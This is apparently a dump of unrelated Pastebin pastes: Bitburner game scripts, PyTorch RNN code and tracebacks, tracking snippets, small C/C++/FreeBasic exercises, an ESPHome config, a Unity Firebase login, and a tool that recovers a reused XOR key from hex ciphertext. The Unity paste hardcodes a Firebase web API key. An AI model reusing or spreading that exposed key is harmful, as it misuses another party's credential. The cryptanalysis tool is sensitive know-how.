			case ""LOOP"":
				return new LOOP(args, content).run(data, ns);
				break;
		}
	}
}

class Arg {
	#command;
	#name;
	#value;

	/**
	 * @param {Command} command
	 * @param {string} name
	 * @param {string} value
	 */
	constructor(command, name, value) {
		this.#command = command;
		this.#name = name;
		this.#value = value;
	}


	get command() {
		return this.#command;
	}

	get name() {
		return this.#name;
	}

	get value() {
		return this.#value;
	}
}

class LOOP {
	#args;
	#content;

	/**
	 *@param {Arg[]} args
	 *@param {string} content
	 */
	constructor(args, content) {
		this.#args = args;
		this.#content = content;
	}

	get args() {
		return this.#args;
	}

	get content() {
		return this.#content;
	}

	/**
	 * @param {Collection} data
	 * @param {NS} ns
	 */
	run(data, ns) {
		const items = this.#args.find(arg => arg.name.trim() === ""items"");
		const item = this.#args.find(arg => arg.name.trim() === ""item"");
		const itemStatus = this.#args.find(arg => arg.name.trim() === ""itemStatus"");
		const begin = this.#args.find(arg => arg.name.trim() === ""begin"");
		const end = this.#args.find(arg => arg.name.trim() === ""end"");

		let new_content = """";
		if (items === undefined) {
			if (begin !== undefined && end !== undefined) {
				if (item === undefined) {
					return this.#content.repeat(Number(end.value) - Number(begin.value) + 1);
				} else {
					for (let i = begin.value; i <= end.value; i++) {
						new_content += this.#content;
						new_content = new_content.replaceAll(""${"" + item.value + ""}"", i);
					}
				}
			}
		} else if (item === undefined && itemStatus !== undefined) {
			for (let i = 0; i < data.data[items.value].length; i++) {
				new_content += this.#content;
				new_content = new_content.replaceAll(""${"" + itemStatus.value + ""}"", i);
			}
		} else if (item !== undefined && itemStatus === undefined) {
			for (let i = 0; i < data.data[items.value].length; i++) {
				new_content += this.#content;
				new_content = new_content.replaceAll(""${"" + item.value + ""}"", data.data[items.value][i]);
			}
		} else {
			for (let i = 0; i < data.data[items.value].length; i++) {
				new_content += this.#content;
				new_content = new_content.replaceAll(""${"" + item.value + ""}"", data.data[items.value][i]);
				new_content = new_content.replaceAll(""${"" + itemStatus.value + ""}"", i);
			}
		}

		return new_content;
	}
}"
3uDqueBr,Untitled,dertarchingratadata,JSON,Wednesday 24th of April 2024 10:05:02 AM CDT,"{
  ""feature"": ""Grata Dealmaker""
}"
3nWD1xpF,FileExplorer.js,Arinek,JavaScript,Wednesday 24th of April 2024 10:02:17 AM CDT,"import { ArinekHTML } from ""ArinekOS/ArinekHTML.js"";
import { Collection } from ""ArinekOS/Collection.js"";


/** @param {NS} ns */
export async function main(ns) {
	let fileExplorer = new FileExplorer(ns);
	fileExplorer.start();
}

class FileExplorer {
	parser;
	data;
	doc;
	fileExplorer;

	#ns;
	#host_server;
	#current_path;
	#selected_files;

	/**
	 * @param {NS} ns
	 */
	constructor(ns) {
		this.#ns = ns;
		this.#host_server = ns.getHostname();
		this.#current_path = """";
		this.#selected_files = [];

		this.parser = new ArinekHTML(ns, ""ArinekOS/FileExplorer/Content/index.html.txt"");
		this.data = new Collection();
		this.doc = eval(""document"");
		this.fileExplorer = this.openWindow();

		this.addCSS(""ArinekOS/FileExplorer/Content/styles.css.txt"");
	}

	start() {
		this.update();
	}

	openWindow() {
		this.#ns.alert(""<div id='explorer-window' class='explorer-window'></div>"");
		const fileExplorerWindow = this.doc.getElementById(""explorer-window"");

		return fileExplorerWindow;
	}

	/**
	  * @param {string} css_file
	  */
	addCSS(css_file) {
		const css = this.#ns.read(css_file);

		// Add the css to the game
		let styleDiv = this.doc.getElementById('myCustomStyles');
		if (!styleDiv) {
			// Make a new new div
			styleDiv = this.doc.createElement(""div"");
			styleDiv.id = 'myCustomStyles';
			this.doc.getElementsByTagName('head')[0].appendChild(styleDiv);
		}
		styleDiv.innerHTML = ""<style>"" + css + ""</style>"";
	}

	update() {
		let fileTree = new Folder(this.#ns, this.#current_path, this.#host_server);
		let terminal = new FakeTerminal(this.doc);

		this.data.add(""folders"", fileTree.subfolder_names);
		this.data.add(""files"", fileTree.files);
		this.data.add(""selected_files"", this.#selected_files);
		this.data.add(""current_path"", this.#current_path);

		this.parser.parse(this.data);
		this.fileExplorer.innerHTML = this.parser.html;

		let folder_divs = this.doc.getElementsByClassName(""explorer-directory"");
		for (let folder_div of folder_divs) {
			folder_div.addEventListener(""dblclick"", e => {
				const folder = fileTree.getFolderByName(folder_div.id);
				this.#current_path = folder.path;
				this.#selected_files = [];
				this.update();
			})
		}

		let file_divs = this.doc.getElementsByClassName(""explorer-file"");
		for (let file_div of file_divs) {
			file_div.addEventListener(""click"", e => {
				const file = this.#current_path + file_div.id;
				this.toggleSelectedFile(file);
				this.update();
			});
		}

		let openButton = this.doc.getElementById(""explorer-open"");
		openButton.addEventListener(""click"", e => {
			terminal.openFiles(this.#selected_files);

		});

		let removeButton = this.doc.getElementById(""explorer-remove"");
		removeButton.addEventListener(""click"", e => {
			terminal.removeFiles(this.#selected_files);
		});
	}

	toggleSelectedFile(file) {
		if (this.#selected_files.includes(file)) {
			this.#selected_files = this.#selected_files.filter(selected_file => selected_file !== file);
		} else {
			this.#selected_files.push(file);
		}
	}
}

class Folder {
	path;
	subfolders;
	files;
	#ns;
	#host_server;


	/**
	 * @param {NS} ns
	 * @param {string} path
	 * @param {string} host_server
	 */
	constructor(ns, path, host_server) {
		this.#ns = ns;
		this.#host_server = host_server;
		this.path = path;

		this.subfolders = this.getFiles(this.#ns, this.path).folders;
		this.files = this.getFiles(this.#ns, this.path).files;
	}

	getFiles() {
		let files = this.#ns.ls(this.#host_server, this.path);
		let folders = [];

		const nextFolderIndex = this.path.length;

		for (let file of files) {
			const endOfNextFolderIndex = file.indexOf(""/"", nextFolderIndex + 1);
			if (endOfNextFolderIndex !== -1) {
				const folder_name = file.slice(nextFolderIndex, endOfNextFolderIndex);
				const folder_path = file.slice(0, endOfNextFolderIndex + 1);

				const folder = new Folder(this.#ns, folder_path, this.#host_server);

				if (folders.every(folder => folder.path !== folder_path)) folders.push(folder);
			}
		}

		files = files.filter(file => file.slice(nextFolderIndex + 1).indexOf(""/"") === -1);
		return {
			folders: folders,
			files: files
		};
	}

	get name() {
		let lastIndex = this.path.lastIndexOf(""/"");
		let temp = this.path.slice(0, lastIndex);
		lastIndex = temp.lastIndexOf(""/"");

		if (lastIndex === -1) return temp;
		return temp.slice(lastIndex + 1);
	}

	get subfolder_names() {
		let names = [];
		for (const subfolder of this.subfolders) {
			names.push(subfolder.name);
		}
		return names;
	}

	getFolderByName(name) {
		return this.subfolders.find(subfolder => subfolder.name === name);
	}
}

class FakeTerminal {
	#terminal;

	/**
	 * @param {document} doc
	 */
	constructor(doc) {
		this.#terminal = doc.getElementById(""terminal-input"");
	}

	runCommand(command) {
		// Print the command to the terminal input field
		this.#terminal.value = command;

		// Get a reference to the React event handler.
		const handler = Object.keys(this.#terminal)[1];

		// Perform an onChange event to set some internal values.
		this.#terminal[handler].onChange({ target: this.#terminal });

		// Simulate an enter press
		this.#terminal[handler].onKeyDown({ key: 'Enter', preventDefault: () => null });
	}

	openFiles(files) {
		let command = ""nano"";
		for (const file of files) {
			command += "" "" + file;
		}

		this.runCommand(command);
	}

	async removeFiles(files) {
		let command = """";
		for (let file of files) {
			command += ""rm "" + file + "";"";
		}
		this.runCommand(command);
	}
}"
82g3cBZk,Custom RNN Architecture,KDLPro,Python,Wednesday 24th of April 2024 10:01:23 AM CDT,"# Define our network class by using the nn.module
class ResBlockMLP(nn.Module):
    def __init__(self, input_size, output_size):
        super(ResBlockMLP, self).__init__()
        self.norm1 = nn.LayerNorm(input_size)
        self.fc1 = nn.Linear(input_size, input_size//2)
        
        self.norm2 = nn.LayerNorm(input_size//2)
        self.fc2 = nn.Linear(input_size//2, output_size)
        
        self.fc3 = nn.Linear(input_size, output_size)

        self.act = nn.ELU()

    def forward(self, x):
        x = self.act(self.norm1(x))
        skip = self.fc3(x)
        
        x = self.act(self.norm2(self.fc1(x)))
        x = self.fc2(x)
        
        return x + skip


class RNN(nn.Module):
    def __init__(self, seq_len, output_size, num_blocks=1, buffer_size=128):
        super(RNN, self).__init__()
        
        seq_data_len = seq_len * 2

        self.input_mlp = nn.Sequential(nn.Linear(seq_data_len, 4 * seq_data_len),
                                       nn.ELU(),
                                       nn.Linear(4 * seq_data_len, 128),
                                       nn.ELU(),)
        
        self.rnn = nn.Linear(256, 128)
        
        blocks = [ResBlockMLP(128, 128) for _ in range(num_blocks)]
        self.res_blocks = nn.Sequential(*blocks)
        
        self.fc_out = nn.Linear(128, output_size)
        self.fc_buffer = nn.Linear(128, buffer_size)
        self.act = nn.ELU()


    def forward(self, input_seq, buffer_in):
        input_seq = input_seq.reshape(input_seq.shape[0], -1)
        input_vec = self.input_mlp(input_seq)
        
        # Concatenate the previous step buffer
        x_cat = torch.cat((buffer_in, input_vec), 1)
        x = self.rnn(x_cat)

        x  = self.act(self.res_blocks(x))
        
        return self.fc_out(x), torch.tanh(self.fc_buffer(x))"
rmuSH0j7,Error 2,KDLPro,Python,Wednesday 24th of April 2024 09:58:51 AM CDT,"---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torchinfo\torchinfo.py:295, in forward_pass(model, x, batch_dim, cache_forward_pass, device, mode, **kwargs)
    294 if isinstance(x, (list, tuple)):
--> 295     _ = model(*x, **kwargs)
    296 elif isinstance(x, dict):

File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torch\nn\modules\module.py:1518, in Module._wrapped_call_impl(self, *args, **kwargs)
   1517 else:
-> 1518     return self._call_impl(*args, **kwargs)

File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torch\nn\modules\module.py:1568, in Module._call_impl(self, *args, **kwargs)
   1566     args = bw_hook.setup_input_hook(args)
-> 1568 result = forward_call(*args, **kwargs)
   1569 if _global_forward_hooks or self._forward_hooks:

TypeError: forward() missing 1 required positional argument: 'buffer_in'

The above exception was the direct cause of the following exception:

RuntimeError                              Traceback (most recent call last)
Cell In[21], line 2
      1 from torchinfo import summary
----> 2 summary(gps_rnn, input_size=(batch_size, 32, 14, 2))

File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torchinfo\torchinfo.py:223, in summary(model, input_size, input_data, batch_dim, cache_forward_pass, col_names, col_width, depth, device, dtypes, mode, row_settings, verbose, **kwargs)
    216 validate_user_params(
    217     input_data, input_size, columns, col_width, device, dtypes, verbose
    218 )
    220 x, correct_input_size = process_input(
    221     input_data, input_size, batch_dim, device, dtypes
    222 )
--> 223 summary_list = forward_pass(
    224     model, x, batch_dim, cache_forward_pass, device, model_mode, **kwargs
    225 )
    226 formatting = FormattingOptions(depth, verbose, columns, col_width, rows)
    227 results = ModelStatistics(
    228     summary_list, correct_input_size, get_total_memory_used(x), formatting
    229 )

File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torchinfo\torchinfo.py:304, in forward_pass(model, x, batch_dim, cache_forward_pass, device, mode, **kwargs)
    302 except Exception as e:
    303     executed_layers = [layer for layer in summary_list if layer.executed]
--> 304     raise RuntimeError(
    305         ""Failed to run torchinfo. See above stack traces for more details. ""
    306         f""Executed layers up to: {executed_layers}""
    307     ) from e
    308 finally:
    309     if hooks:

RuntimeError: Failed to run torchinfo. See above stack traces for more details. Executed layers up to: []"
Lt9rZD3y,Error 1,KDLPro,Python,Wednesday 24th of April 2024 09:57:44 AM CDT,"---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torchsummary\torchsummary.py:140, in summary(model, input_data, batch_dim, branching, col_names, col_width, depth, device, dtypes, verbose, *args, **kwargs)
    139     with torch.no_grad():
--> 140         _ = model.to(device)(*x, *args, **kwargs)  # type: ignore[misc]
    141 except Exception as e:

File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torch\nn\modules\module.py:1518, in Module._wrapped_call_impl(self, *args, **kwargs)
   1517 else:
-> 1518     return self._call_impl(*args, **kwargs)

File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torch\nn\modules\module.py:1527, in Module._call_impl(self, *args, **kwargs)
   1524 if not (self._backward_hooks or self._backward_pre_hooks or self._forward_hooks or self._forward_pre_hooks
   1525         or _global_backward_pre_hooks or _global_backward_hooks
   1526         or _global_forward_hooks or _global_forward_pre_hooks):
-> 1527     return forward_call(*args, **kwargs)
   1529 try:

TypeError: forward() missing 1 required positional argument: 'buffer_in'

The above exception was the direct cause of the following exception:

RuntimeError                              Traceback (most recent call last)
Cell In[20], line 2
      1 from torchsummary import summary
----> 2 summary(gps_rnn, (32,14,2))

File D:\ProgramData\Miniconda_3.9\envs\rnn-sample-py3.9\lib\site-packages\torchsummary\torchsummary.py:143, in summary(model, input_data, batch_dim, branching, col_names, col_width, depth, device, dtypes, verbose, *args, **kwargs)
    141 except Exception as e:
    142     executed_layers = [layer for layer in summary_list if layer.executed]
--> 143     raise RuntimeError(
    144         ""Failed to run torchsummary. See above stack traces for more details. ""
    145         ""Executed layers up to: {}"".format(executed_layers)
    146     ) from e
    147 finally:
    148     if hooks is not None:

RuntimeError: Failed to run torchsummary. See above stack traces for more details. Executed layers up to: []"
25YcrRp6,Untitled,dllbridge,C,Wednesday 24th of April 2024 09:47:18 AM CDT,"

int n1 = 1,      //  0001
    n2 = 4,      //  0100
	n;  
	
	
int *p = &n; 

int &r =  n; 


/*



#include   <stdio.h>

int n1 = 1,      //  0001
    n2 = 4,      //  0100
	n;  


/////////////////////////////////////////////////////////
int main()
{
	
	
	// n1 > 0 && n2 <= 0
	
	if( n1 > 0 && n2 <= 0) printf(""SONY  \n"");
	else                   printf(""error \n""); 
	
	
	printf(""true   = %d\n"",  true);
	printf(""false  = %d\n"", false);
}



*/


























/*

#include   <stdio.h>

int n1 = 1,      //  0001
    n2 = 4,      //  0100
	n;  


/////////////////////////////////////////////////////////
int main()
{
	
	n = n1 & n2;
	
	printf(""n = %d\n"", n);	
}





*/



















/*

#include   <stdio.h>

int n1 = 1,      //  0001
    n2 = 4,      //  0100
	n;  


/////////////////////////////////////////////////////////
int main()
{
	
	n = n1 | n2;
	
	printf(""n = %d\n"", n);	
}




*/





















/*

#include   <stdio.h>

int n = 1;


/////////////////////////////////////////////////////////
int main()
{
	
	
	n = n  + 1;                  // n += 1;
	n = n << 2;                // n <<= 2;  
	
	printf(""n = %d\n"", n);
	
}


*/






"
CAZiLJeH,9,nq1s788,Python,Wednesday 24th of April 2024 09:25:42 AM CDT,"file = open('9.csv')
cnt = 0
for s in file:
    #a = sorted(list(map(int, s.split(';')[:3])))
    #if a[0] + a[1] > a[2]:
    #    cnt += 1
    s.split(';')
    a = int(s[0])
    b = int(s[1])
    c = int(s[2])
    if a + b > c and a + c > b and c + b > a:
        cnt += 1
print(cnt)
"
0MzmKEke,GA4 - Purchase - R.EV,CharlotteVDB,JavaScript,Wednesday 24th of April 2024 09:04:03 AM CDT,"window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
   event: 'purchase',  			// name of the event. In this case, it always must be purchase
   ecommerce: {			
      currency: 'EUR',
	  value: '72,93',
	  shipping: '7.95',
	  transaction_id: '45734',
	  coupon: 'blackfriday',
 	  items: [{	
     	 item_name: 'R.EV World Champ TT ""Time"" T-shirt Black', 			// insert a product name
	 	 item_id: '123456789',						// insert an actual product ID
     	 price: '34.99',  // insert an actual product price. Number or a string. Don't include currency code
     	 item_brand: 'R.EV',			
     	 item_category: 'World Champ TT collection',	// category of a product (= collection)
 		 item_category: 'T-shirt',			// subcategory of a product (= type of clothing)
  	 	 item_variant: 'S',			// variant of a product
     	 quantity: '1'						
},{
	  item_name: 'R.EV Logo Beanie', 	// insert a product name
	  item_id: '987654321',						// insert an actual product ID
      price: '29.99',					// insert an actual product price. Number or a string. Don't include currency code
      item_brand: 'R.EV',			
      item_category: 'The R.EV Classics',			// category of a product (= collection)
	  item_category2: 'Beanie',			// subcategory of a product (= type of clothing)
  	  item_variant: 'S',		// variant of a product
      quantity: '1'						
	}]
  }
});"
3SUQAYYD,Untitled,Mysoft,FreeBasic,Wednesday 24th of April 2024 08:44:21 AM CDT,"#include ""crt.bi""

function WildMatch( sWildText as string , sCompare as string , iCaseSensitive as boolean = false ) as boolean
  dim as integer iTxt, iCmp
  
  'if any of them is empty... then result is direct
  if sCompare[0] = 0 then return false  
  do
    var iCT = sWildText[iTxt] : iTxt += 1
    var iCC = sCompare[iCmp] : iCmp += 1 
    'print iTxt-1;"" "";chr(iCT),iCmp-1;"" "";chr(iCC)
    select case iCT
    case 0        : return iCC=0 'once it text reachs end.. it's a success
    case asc("" "") 'white space (at least 1)
      dim as long iNum = 0
      do
        select case iCC
        case asc("" ""),asc(!""\r""),asc(!""\n""),asc(!""\t"") 
          iNum += 1 : iCC = sCompare[iCmp] : iCmp += 1
        case else
          if iNum=0 then return false 'must at least have one blank
          iCmp -= 1 : continue do,do 'continue repeating same char
        end select
      loop          
    case asc(""?"") : 'if it's a single char wild
      'we're done if reached end of comparsion
      'and it will be true if next wildtext is also done
      if iCC=0 then return sWildText[iTxt]=0        
    case asc(""*"")       
      var iCT2 = sWildText[iTxt]
      'if matching anything after then it will be true if it's the end of wildtext
      if iCT2 = 0 then return true
      'if is not another wildcard then must continue checking
      if iCT2 <> asc(""?"") andalso iCT2 <> asc(""*"") then         
        'if end of compare text happened then it's false!
        if iCC = 0 then return false
        'if found matching char then continue matching
        if iCaseSensitive then
          if iCC=iCT2 then iTxt += 1: continue do
        else
          if ToLower(iCC)=ToLower(iCT2) then iTxt += 1: continue do
        end if
        'otherwise goes back on wildtext (to compare against *) again
        iTxt -= 1 : continue do
      end if
      'next is also a wildcard, so we will process that
    case else 'is a direct comparsion... 
      'if compare string finished or didnt match then we failed
      if iCC=0 then return false
      if iCaseSensitive then
        if iCC<>iCT then return false
      else
        if ToLower(iCC)<>ToLower(iCT) then return false
      end if
    end select
  loop
end function

print ""Expected"",""Result""
print string(24,""-"")
print true,  WildMatch(""Hello"",""Hello"")
print false, WildMatch(""Hell"",""Hello"")
print false, WildMatch(""Hello"",""Hell"")
print false, WildMatch(""Hello"",""HELLO"",true)
print false, WildMatch(""Hello"",""World"")
print true,  WildMatch(""B?n"",""Bin"")
print true,  WildMatch(""b?n"",""Ben"")
print false, WildMatch(""B?n"",""Bem"")
print true,  WildMatch(""*us"",""jealous"")
print false, WildMatch(""*us"",""jealously"")
print true,  WildMatch(""Bang*"",""Bangaloo"")
print false, WildMatch(""Leap*"",""lip"")
print false, WildMatch(""Bi*us"",""Binocculus"") 'want this to be true?
print true,  WildMatch(""Bi*us"",""Binocc?lus"")
print true,  wildMatch(""*cup*"",""Porcupine"")
print true,  WildMatch(""*Hi*Ta*"",""Hippopotamus"")
print true,  WildMatch("" Hello"",!""\t\r\n  Hello"")
print false,  WildMatch("" Hello"",!""Hello"")

sleep
"
EGKthbzM,Untitled,Lux-Ferre,Python,Wednesday 24th of April 2024 08:34:55 AM CDT,"def better_calc(self, action):
    message = action[""payload""]
    player = message[""player""]
    request_source = action[""source""]

    command = message[""parsed_command""]

    def parse_input(raw_input: str) -> list:
        pattern = re.compile(r""([+/*-])"")
        input_with_spaces = re.sub(pattern, r"" \1 "", raw_input)

        input_list = input_with_spaces.split()

        def is_floatable(n):
            n = n.replace(""."", """", 1)
            return n.isnumeric()

        converted_list = [float(value) if is_floatable(value) else value for value in input_list]

        for value in converted_list:
            if not (isinstance(value, float) or re.search(pattern, value)):
                raise ValueError

        return converted_list

    if command['payload'] is not None:
        input_string = command[""payload""]
    else:
        return

    calculation_map = {
        ""*"": (lambda a, b: a * b),
        ""/"": (lambda a, b: a / b),
        ""+"": (lambda a, b: a + b),
        ""-"": (lambda a, b: a - b),
    }

    parsed_list = parse_input(input_string)

    if len(parsed_list) % 2 == 0:
        return

    for operator, func in calculation_map.items():
        while operator in parsed_list:
            op_index = parsed_list.index(operator)

            a = parsed_list[op_index - 1]
            b = parsed_list[op_index + 1]

            if operator == ""/"" and b == 0:
                print(""Better calc: divide by zero error."")
                return
            new_value = func(a, b)

            parsed_list[op_index - 1] = new_value
            del parsed_list[op_index:op_index + 2]

    reply_string = f""{player['username'].capitalize()}, here is the result: {parsed_list[0]}"""
s9msNDSz,Untitled,Learning000001,C#,Wednesday 24th of April 2024 08:18:19 AM CDT," private const string WEB_API_KEY = ""AIzaSyBwAcfu-00sN9qH66i499dzf5SjBaFQ358"";   
 private string userLocalId;
 private string userIdToken;

 public void TryLoginAndGetData(string _email, string _passwrod, Action<bool> _callBack)
    {
        string _loginParms = ""{\""email\"":\"""" + _email + ""\"",\""password\"":\"""" + _passwrod +
                             ""\"",\""returnSecureToken\"":true}"";

        StartCoroutine(Post(""https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key="" + WEB_API_KEY,
            _loginParms, (_result) =>
            {
                SignInResponse _signInResponse = JsonConvert.DeserializeObject<SignInResponse>(_result);
                userIdToken = _signInResponse.IdToken;
                userLocalId = _signInResponse.LocalId;
				//collect data if need, then return callback with true
            }, (_result) => { Register(_callBack, _loginParms); }, false));
    }

    private void Register(Action<bool> _callBack, string _parms)
    {
        StartCoroutine(Post(""https://identitytoolkit.googleapis.com/v1/accounts:signUp?key="" + WEB_API_KEY, _parms,
            (_result) =>
            {
                RegisterResponse _registerResult = JsonConvert.DeserializeObject<RegisterResponse>(_result);
                userIdToken = _registerResult.IdToken;
                userLocalId = _registerResult.LocalId;
				//collect data if need, then return callback with true
            }, (_result) =>
            {
                Debug.Log(""Register failed"");
                _callBack?.Invoke(false);
            }));
    }

    private IEnumerator Post(string _uri, string _jsonData, Action<string> _onSuccess, Action<string> _onError,
        bool _includeHeader = true)
    {
        if (userIdToken != null)
        {
            if (_includeHeader)
            {
                _uri = $""{_uri}?auth={userIdToken}"";
            }
        }

        using (UnityWebRequest _webRequest = UnityWebRequest.Post(_uri, _jsonData))
        {
            byte[] _jsonToSend = new System.Text.UTF8Encoding().GetBytes(_jsonData);
            _webRequest.uploadHandler = new UploadHandlerRaw(_jsonToSend);
            _webRequest.downloadHandler = new DownloadHandlerBuffer();

            yield return _webRequest.SendWebRequest();

            if (_webRequest.result == UnityWebRequest.Result.Success)
            {
                _onSuccess?.Invoke(_webRequest.downloadHandler.text);
            }
            else
            {
                _onError?.Invoke(_webRequest.error);
            }

            _webRequest.uploadHandler.Dispose();
            _webRequest.downloadHandler.Dispose();
            _webRequest.Dispose();
        }
    }


[Serializable]
public class RegisterResponse
{
    public string IdToken; //A Firebase Auth ID token for the newly created user.
    public string Email; //The email for the newly created user
    public string RefreshToken; //A Firebase Auth refresh token for the newly created user.
    public string ExpiresIn; //The number of seconds in which the ID token expires.
    public string LocalId; //The uid of the newly created user.
}

[Serializable]
public class SignInResponse
{
    public string IdToken;
    public string Email;
    public string RefreshToken;
    public string ExpiresIn;
    public string LocalId;
    public bool Registered;
}
"
ERpGhRQ1,rtb house - product size selection f&f,filipr27,JavaScript,Wednesday 24th of April 2024 08:13:39 AM CDT,"<script>
window.dataLayer = window.dataLayer || [];
window.dataLayer.push({
 'event': 'product_size_selected',
 'size': 'L'  //E.g. S, XXL, medium, 38, 44, etc.
 });
</script>"
RdXXxscv,Untitled,Hero_Cheats,PHP,Wednesday 24th of April 2024 07:54:47 AM CDT,RiverToSeaPalestineFree
FSyXvsFW,Untitled,MeehoweCK,C++,Wednesday 24th of April 2024 07:25:22 AM CDT,"#include <iostream>
#include <vector>
#include <forward_list>
#include <functional>
#include <algorithm>

std::vector<int> dodajParzyste() {
	std::cout << ""Dodaje parzyste\n"";
	std::vector<int> wynik{ 2, 4, 6 };
	return wynik;
}

std::vector<int> dodajNieparzyste() {
	std::cout << ""Dodaje nieparzyste\n"";
	std::vector<int> wynik{ 1, 3, 5 };
	return wynik;
}

std::vector<int> dodajKolejne(int a, int b) {
	std::cout << ""Dodaje liczby od "" << a << "" do "" << b << std::endl;
	std::vector<int> result{};
	for (auto i{ a }; i <= b; ++i) {
		result.push_back(i);
	}
	return result;
}

template <typename Container>
void addElementsToContainer(Container& existing, Container&& added) {
	std::move(added.begin(), added.end(), std::back_inserter(existing));
}

int main() {
	std::forward_list<std::function<std::vector<int>()>> funkcje{};
	funkcje.push_front(dodajParzyste);
	funkcje.push_front(dodajNieparzyste);
	auto funkcja{ std::bind(dodajKolejne, 12, 20) };
	funkcje.push_front(funkcja);

	std::vector<int> liczby{};
	std::for_each(funkcje.begin(), funkcje.end(), [&liczby](const auto& func) {
		addElementsToContainer(liczby, func());
		});

	for (auto x : liczby) {
		std::cout << x << '\n';
	}
	return 0;
}"
vFjSrsFA,Untitled,yurghie,YAML,Wednesday 24th of April 2024 07:16:41 AM CDT,"substitutions:
  name: vp-oppe
  friendly_name: Varmepumpe oppe

esphome:
  name: ${name}
  platform: ESP8266
  board: d1_mini
  # Boards tested: ESP-01S (ESP8266), Wemos D1 Mini (ESP8266); ESP32 Wifi-DevKit2

wifi:
  ssid: !secret wifi_ssid
  password: !secret wifi_password
  domain: .lan
  # Enable fallback hotspot (captive portal) in case wifi connection fails
  ap:
    ssid: ""${friendly_name} Fallback Hotspot""
    password: !secret fallback_password

# Note: if upgrading from 1.x releases of esphome-mitsubishiheatpump, be sure
# to remove any old entries from the `libraries` and `includes` section.
#libraries:
  # Remove reference to SwiCago/HeatPump

#includes:
  # Remove reference to src/esphome-mitsubishiheatpump

captive_portal:

# Enable logging
logger:
  # ESP8266 only - disable serial port logging, as the HeatPump component
  # needs the sole hardware UART on the ESP8266
  baud_rate: 0
  level: DEBUG
  logs:
    component: ERROR

mqtt:
  broker: !secret mqtt_addr
  username: !secret mqtt_user
  password: !secret mqtt_password
  keepalive: 
    seconds: 120

ota:

# Enable Web server.
web_server:
  port: 80

time:
  - platform: sntp
    id: sntp_time
    timezone: Europe/Oslo
    servers:
     - 0.pool.ntp.org
     - 1.pool.ntp.org
     - 2.pool.ntp.org

# Text sensors with general information.
text_sensor:
  # Expose ESPHome version as sensor.
  - platform: version
    name: ${name} ESPHome Version
  # Expose WiFi information as sensors.
  - platform: wifi_info
    ip_address:
      name: ${name} IP
    ssid:
      name: ${name} SSID
    bssid:
      name: ${name} BSSID

# Sensors with general information.
sensor:
  # Uptime sensor.
  - platform: uptime
    name: ${name} Uptime

  # WiFi Signal sensor.
  - platform: wifi_signal
    name: ${name} WiFi Signal
    update_interval: 60s

external_components:
  - source: github://geoffdavis/esphome-mitsubishiheatpump

climate:
  - platform: mitsubishi_heatpump
    name: ""${friendly_name}""

    # ESP32 only - change UART0 to UART1 or UART2 and remove the
    # logging:baud_rate above to allow the built-in UART0 to function for
    # logging.
    hardware_uart: UART0

switch:
  - platform: restart
    name: ""Restart"""
qzNzMiri,Untitled,MeehoweCK,C++,Wednesday 24th of April 2024 07:09:26 AM CDT,"#include <iostream>
#include <vector>
#include <forward_list>
#include <functional>
#include <algorithm>

std::vector<int> dodajParzyste() {
	std::cout << ""Dodaje parzyste\n"";
	std::vector<int> wynik{ 2, 4, 6 };
	return wynik;
}

std::vector<int> dodajNieparzyste() {
	std::cout << ""Dodaje nieparzyste\n"";
	std::vector<int> wynik{ 1, 3, 5 };
	return wynik;
}

template <typename Container>
void addElementsToContainer(Container& existing, Container&& added) {
	std::move(added.begin(), added.end(), std::back_inserter(existing));
}

int main() {
	std::forward_list<std::function<std::vector<int>()>> funkcje{};
	funkcje.push_front(dodajParzyste);
	funkcje.push_front(dodajNieparzyste);

	std::vector<int> liczby{};
	std::for_each(funkcje.begin(), funkcje.end(), [&liczby](const auto& func) {
		addElementsToContainer(liczby, func());
		});

	for (auto x : liczby) {
		std::cout << x << '\n';
	}
	return 0;
}"
eZM9cakR,Mad,Unknown_No_1,PHP,Wednesday 24th of April 2024 06:31:50 AM CDT,Wait Karo guys key jald hi update hoga
1hjbNMDb,Untitled,nicoviale_,Python,Wednesday 24th of April 2024 06:00:40 AM CDT,"import curses

def hex_to_text(hex_str):
    """"""
    Convert a hex string to text, replacing non-printable characters with '*'.
    """"""
    text = ''
    for i in range(0, len(hex_str), 2):
        try:
            byte = int(hex_str[i:i+2], 16)
            if chr(byte) in ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}:.,;!?() "":  
                text += chr(byte)
            else:
                text += '*'
        except ValueError:
            text += '*'
    return text

def xor_column(cursor_x, cursor_y, new_char, lines, file_name):
    # Find the character in the position x, y in the original file
    try:
        with open(file_name, 'r') as file:
            orig_hexlines = file.readlines()
    except FileNotFoundError:
        print(""File not found."")
        return
    
    #matrix of the original file containing the numerical values of the characters 
    orig_lines = [[int(hex_str[i:i+2], 16) for i in range(0, len(hex_str), 2)] for hex_str in orig_hexlines]
    original_char = chr(orig_lines[cursor_y][cursor_x])

    # XOR it with the new character to get the key
    key = ord(original_char) ^ ord(new_char)

    # XOR the key with the corresponding character in the other lines to get the plaintext
    for row in range(len(lines)):
        if row != cursor_y:
            char = lines[row][cursor_x]
            xor_char = chr(ord(char) ^ key)
            lines[row] = lines[row][:cursor_x] + xor_char + lines[row][cursor_x+1:]

    return lines

def main(stdscr):
    curses.curs_set(1)  # Set cursor to visible
    stdscr.clear()
    stdscr.refresh()

    file_name = ""message.enc""
    try:
        with open(file_name, 'r') as file:
            hex_lines = file.readlines()
    except FileNotFoundError:
        print(""File not found."")
        return

    lines = [hex_to_text(line.strip()) for line in hex_lines]

    cursor_y, cursor_x = 0, 0

    #enable keypad
    stdscr.keypad(True)

    while True:
        stdscr.clear()

        for i, line in enumerate(lines):
            if 0 <= i < curses.LINES:
                stdscr.addstr(i, 0, line)
        stdscr.move(cursor_y, cursor_x)
        stdscr.refresh()

